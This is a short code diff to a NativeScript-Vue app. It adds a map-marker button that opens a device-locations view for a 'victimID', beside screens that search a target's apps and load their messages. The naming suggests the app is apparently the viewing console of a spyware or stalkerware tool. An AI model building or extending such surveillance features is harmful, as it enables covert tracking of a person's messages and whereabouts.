@@ -9,10 +9,15 @@
       />
       <StackLayout>
         <GridLayout v-show="!selectedAppName" rows="auto,*" columns="*">
-          <StackLayout class="bg-dark-orange">
-            <CardView elevation="10" margin="15">
+          <StackLayout orientation="horizontal" class="bg-dark-orange">
+            <CardView width="80%" elevation="10" margin="10">
               <SearchBar row="0" hint="App name..." v-model="appSearchPhrase" />
             </CardView>
+            <StackLayout width="20%">
+              <Ripple @tap="showDeviceLocations" class="m-y-10 m-r-10" backgroundColor="white">
+                <Label :text="'mdi-map-marker' | fonticon" textAlignment="center" verticalAlignment="center" :fontSize="30" class="mdi m-10 text-dark-orange" />
+              </Ripple>
+            </StackLayout>
           </StackLayout>
           <ListView
             @itemTap="selectApp"
@@ -142,6 +147,11 @@ export default {
       });
   },
   methods: {
+    showDeviceLocations(){
+      this.navigate("/device/locations",{
+        victimID: this.victimID
+      })
+    },
     loadMoreMessages(e){
       if(this.appSearchInApp.length > 0 || this.isLoadingMoreMessages){
         return;
